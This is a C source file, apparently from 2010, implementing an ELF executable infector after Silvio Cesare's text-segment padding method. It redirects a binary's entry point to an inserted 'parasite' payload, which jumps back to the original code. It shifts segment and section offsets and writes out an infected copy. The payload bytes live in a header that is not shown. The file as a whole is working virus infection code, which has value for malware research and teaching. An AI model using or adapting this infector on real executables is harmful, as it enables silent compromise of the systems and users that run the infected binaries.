/* oblique 2010
 */
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>
#include <unistd.h>
#include <sys/user.h>
#include <elf.h>
#include <errno.h>
#include "common.h"
#include "infector.h"
#include "parasite.h"

#ifdef BUILD32
#define BITS(name) name##32
#define Elf_Ehdr Elf32_Ehdr
#define Elf_Phdr Elf32_Phdr
#define Elf_Shdr Elf32_Shdr
#define Elf_Addr Elf32_Addr
#elif defined(BUILD64)
#define BITS(name) name##64
#define Elf_Ehdr Elf64_Ehdr
#define Elf_Phdr Elf64_Phdr
#define Elf_Shdr Elf64_Shdr
#define Elf_Addr Elf64_Addr
#endif

#define check_elf BITS(check_elf)
#define infect_elf BITS(infect_elf)
#define parasite BITS(parasite)
#define init_parasite BITS(init_parasite)


#define __FATAL(name) do { \
    print_error(__FILE__, __LINE__-1, errno, name); \
    goto _fatal; \
} while(0)

static unsigned char jmp_entry[] = "\xe9\x00\x00\x00\x00"; // jmp rel_addr

void init_parasite(unsigned char *code, Elf_Addr jmp_vaddr, Elf_Addr entry) {
    memcpy(code, parasite, sizeof(parasite)-1);
    *(int*)&jmp_entry[1] = entry - (jmp_vaddr + 5);
    memcpy(code+sizeof(parasite)-1, jmp_entry, sizeof(jmp_entry)-1);
}

int check_elf(Elf_Ehdr *ehdr) {
    if (ehdr->e_type != ET_EXEC) {
        fprintf(stderr, "[-] ELF not ET_EXEC\n");
        return 0;
    }

    if (ehdr->e_ident[EI_VERSION] != EV_CURRENT) {
        fprintf(stderr, "[-] ELF not current version\n");
        return 0;
    }

#ifdef BUILD32
    if (ehdr->e_machine != EM_386) {
        fprintf(stderr, "[-] ELF not EM_386\n");
        return 0;
    }
#elif defined(BUILD64)
    if (ehdr->e_machine != EM_X86_64) {
        fprintf(stderr, "[-] ELF not EM_X86_64\n");
        return 0;
    }
#endif
    return 1;
}


/* Silvio's algorithm:
    * Increase e_shoff by PAGE_SIZE in the ELF header
    * Patch the insertion code (parasite) to jump to the entry point (original)
    * Locate the text segment program header
        * Modify the entry point of the ELF header to point to the new
        code (p_vaddr + p_filesz)
        * Increase p_filesz by account for the new code (parasite)
        * Increase p_memsz to account for the new code (parasite)
    * For each phdr who's segment is after the insertion (text segment)
        * increase p_offset by PAGE_SIZE
    * For the last shdr in the text segment
        * increase sh_size by the parasite length
    * For each shdr who's section resides after the insertion
        * Increase sh_offset by PAGE_SIZE
    * Physically insert the new code (parasite) and pad to PAGE_SIZE, into
    the file - text segment p_offset + p_filesz (original)
 */

int infect_elf(int fd, int fdout) {
    Elf_Ehdr ehdr;
    Elf_Phdr *phdr = NULL, *next_phdr = NULL;
    Elf_Shdr *shdr = NULL, *next_shdr = NULL;
    unsigned char buf[PAGE_SIZE], *code = NULL;
    int i, j, res, nop;
    off_t pos, text_endoff, shoff;
    size_t psz, padsz;
    Elf_Addr orig_entry;

    printf("[+] Reading headers\n");

    // read ehdr
    if (lseek(fd, 0, SEEK_SET) == -1)
        __FATAL("lseek");

    if ((res = read(fd, &ehdr, sizeof(ehdr))) == -1)
        __FATAL("read");
    else if (res != sizeof(ehdr)) {
        fprintf(stderr, "[-] File is too small\n");
        goto _fatal;
    }

    if (!check_elf(&ehdr))
        goto _fatal;

#ifdef BUILD32
    printf("[+] x86-32bit ELF\n");
#elif defined(BUILD64)
    printf("[+] x86-64bit ELF\n");
#endif

    // read phdrs
    if ((phdr = malloc(ehdr.e_phnum * sizeof(Elf_Phdr))) == NULL)
        __FATAL("malloc");
    
    if (lseek(fd, ehdr.e_phoff, SEEK_SET) == -1)
        __FATAL("lseek");

    if ((res = read(fd, phdr, ehdr.e_phnum * sizeof(Elf_Phdr))) == -1)
        __FATAL("read");
    else if (res != ehdr.e_phnum * sizeof(Elf_Phdr)) {
        fprintf(stderr, "[-] File is too small\n");
        goto _fatal;
    }

    // read shdrs
    if (ehdr.e_shnum > 0) {
        if ((shdr = malloc(ehdr.e_shnum * sizeof(Elf_Shdr))) == NULL)
            __FATAL("malloc");

        if (lseek(fd, ehdr.e_shoff, SEEK_SET) == -1)
            __FATAL("lseek");

        if ((res = read(fd, shdr, ehdr.e_shnum * sizeof(Elf_Shdr))) == -1)
            __FATAL("read");
        else if (res != ehdr.e_shnum * sizeof(Elf_Shdr)) {
            fprintf(stderr, "[-] File is too small\n");
            goto _fatal;
        }
    }

    psz = sizeof(parasite) + sizeof(jmp_entry) - 2;
    printf("[+] Parasite size: %zu bytes\n", psz);

    for (i=0; i<ehdr.e_phnum; i++)
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) { // Locate the text segment program header
            Elf_Shdr *last_shdr = NULL;

            printf("[+] text segment found\n");

            // locate the next segment based on p_vaddr
            for (j=0; j<ehdr.e_phnum; j++)
                if (phdr[j].p_vaddr >= phdr[i].p_vaddr + phdr[i].p_memsz 
                    && (next_phdr == NULL || phdr[j].p_vaddr < next_phdr->p_vaddr))
                        next_phdr = &phdr[j];

            // locate the next section based on p_offset
            for (j=0; j<ehdr.e_shnum; j++)
                if (shdr[j].sh_offset >= phdr[i].p_offset + phdr[i].p_filesz
                    && (next_shdr == NULL || shdr[j].sh_offset < next_shdr->sh_offset))
                        next_shdr = &shdr[j];

            // check if the file can be infected and if it can find the current padding size
            if (next_phdr != NULL && phdr[i].p_vaddr + phdr[i].p_memsz + psz >= next_phdr->p_vaddr) {
                fprintf(stderr, "[-] File does not have enough space for the parasite\n");
                goto _fatal;
            } else if (next_phdr != NULL)
                padsz = next_phdr->p_offset - phdr[i].p_filesz;
            else if (next_shdr != NULL)
                padsz = next_shdr->sh_offset - phdr[i].p_filesz;
            else if (ehdr.e_shnum > 0)
                padsz = ehdr.e_shoff - phdr[i].p_filesz;
            else
                padsz = 0;

            if (next_shdr != NULL && next_shdr->sh_offset - phdr[i].p_filesz < padsz)
                padsz = next_shdr->sh_offset - phdr[i].p_filesz;

            printf("[+] Padding size: %zu\n", padsz);

            if (psz > padsz) {
                printf("[-] parasite size > padding size .. infector will fix some values\n");
                nop = ((psz-padsz) + (PAGE_SIZE - (psz-padsz) % PAGE_SIZE))  / PAGE_SIZE;
            } else
                nop = 0;
 
            text_endoff = phdr[i].p_offset + phdr[i].p_filesz;
            // Modify the entry point of the ELF header to point to the new
            // code (p_vaddr + p_filesz)
            orig_entry = ehdr.e_entry;
            ehdr.e_entry = phdr[i].p_vaddr + phdr[i].p_filesz;
#ifdef BUILD32
            printf("[+] Original entry point: %#x\n", orig_entry);
            printf("[+] New entry point: %#x\n", ehdr.e_entry);
#elif defined(BUILD64)
            printf("[+] Original entry point: %#" PRIx64 "\n", orig_entry);
            printf("[+] New entry point: %#" PRIx64 "\n", ehdr.e_entry);
#endif
            printf("[+] Change text segment's p_filesz and p_memsz\n");
            // Increase p_filesz by account for the new code (parasite)
            phdr[i].p_filesz += psz;
            // Increase p_memsz to account for the new code (parasite)
            phdr[i].p_memsz += psz;
            for (j=0; j<ehdr.e_shnum; j++) { // find the last shdr in the text segment
                if (phdr[i].p_vaddr <= shdr[j].sh_addr 
                        && phdr[i].p_vaddr + phdr[i].p_memsz > shdr[j].sh_addr
                        && (last_shdr == NULL || shdr[j].sh_addr > last_shdr->sh_addr))
                    last_shdr = &shdr[j];
            }
            if (last_shdr != NULL) {
                printf("[+] Change sh_size of the last section of the text segment\n");
                // For the last shdr in the text segment
                //     increase sh_size by the parasite length
                last_shdr->sh_size += psz;

                if (nop > 0) {
                    printf("[+] Change sh_offset of all sections after text segment\n");
                    // For each shdr who's section resides after the insertion
                    //   Increase sh_offset by PAGE_SIZE
                    for (j=0; j<ehdr.e_shnum; j++)
                        if (shdr[j].sh_offset > last_shdr->sh_offset)
                            shdr[j].sh_offset += PAGE_SIZE * nop;
                }
            }
            break;
        }
    

    if (i == ehdr.e_phnum) {
        fprintf(stderr, "[-] text segment not found\n");
        goto _fatal;
    }

    if (nop > 0) {
        printf("[+] Change p_offset of all segments after text segment\n");
        // For each phdr who's segment is after the insertion (text segment)
        //     increase p_offset by PAGE_SIZE
        for (j = 0; j<ehdr.e_phnum; j++)
            if (phdr[j].p_vaddr >= phdr[i].p_vaddr + phdr[i].p_memsz)
                phdr[j].p_offset += PAGE_SIZE * nop;
    }

    if (ehdr.e_shnum > 0) {
        shoff = ehdr.e_shoff;
        if (nop > 0) {
            printf("[+] Change e_shoff of ELF header\n");
            // Increase e_shoff by PAGE_SIZE in the ELF header
            ehdr.e_shoff += PAGE_SIZE * nop;
        }
    }

    // Patch the insertion code (parasite) to jump to the entry point (original)
    printf("[+] Initialize parasite\n");
    if ((code = malloc(psz)) == NULL)
        __FATAL("malloc");
    init_parasite(code, ehdr.e_entry + sizeof(parasite)-1, orig_entry);

    printf("[+] Construct the infected file\n");

    /* construct the infected file */

    // write ehdr
    if (write(fdout, &ehdr, sizeof(Elf_Ehdr)) == -1)
        __FATAL("write");

    // write phdrs
    if (write(fdout, phdr, ehdr.e_phnum * sizeof(Elf_Phdr)) == -1)
        __FATAL("write");

    // write from the end of phdrs until the end of text segment
    pos = lseek(fd, sizeof(Elf_Ehdr) + ehdr.e_phnum * sizeof(Elf_Phdr), SEEK_SET);
    if (pos == -1)
        __FATAL("lseek");

    if (copy_file_bytes(fdout, fd, pos, text_endoff - pos) == -1)
        goto _fatal;

    // Physically insert the new code (parasite) and pad to PAGE_SIZE
    printf("[+] Write the parasite\n");

    if (psz < padsz) {
        memset(buf, 0, padsz);
        memcpy(buf, code, psz);
        if (write(fdout, buf, padsz) == -1)
            __FATAL("write");
    } else {
        if (write(fdout, code, padsz) == -1)
            __FATAL("write");
        pos = padsz;

        for (i=0; i<nop-1; i++) {
            if (write(fdout, code+pos, PAGE_SIZE) == -1)
                __FATAL("write");
            pos += PAGE_SIZE;
        }
        
        memset(buf, 0, PAGE_SIZE);
        memcpy(buf, code+pos, psz - pos);

        if (next_phdr == NULL && next_shdr == NULL && ehdr.e_shnum == 0) {
            if (write(fdout, buf, psz - pos) == -1)
                __FATAL("write");
        } else {
            if (write(fdout, buf, PAGE_SIZE) == -1)
                __FATAL("write");
        }
    }

    if (ehdr.e_shnum > 0) {
        // write from the end of (text segment + padding size) until the start of shdrs
        if (copy_file_bytes(fdout, fd, text_endoff+padsz, shoff-(text_endoff+padsz)) == -1)
            goto _fatal;

        // write the shdrs
        if (write(fdout, shdr, ehdr.e_shnum*sizeof(Elf_Shdr)) == -1)
            __FATAL("write");

        // write until the EOF
        if (lseek(fd, ehdr.e_shnum*sizeof(Elf_Shdr), SEEK_CUR) == -1)
            __FATAL("lseek");
    }

    while ((res = read(fd, buf, PAGE_SIZE)) > 0)
        if (write(fdout, buf, res) == -1)
            __FATAL("write");

    if (res == -1)
        __FATAL("read");

    free(phdr);
    free(shdr);
    free(code);
    return 0;
    
_fatal:
    if (phdr != NULL)
        free(phdr);
    if (shdr != NULL)
        free(shdr);
    if (code != NULL)
        free(code);
    return -1;
}
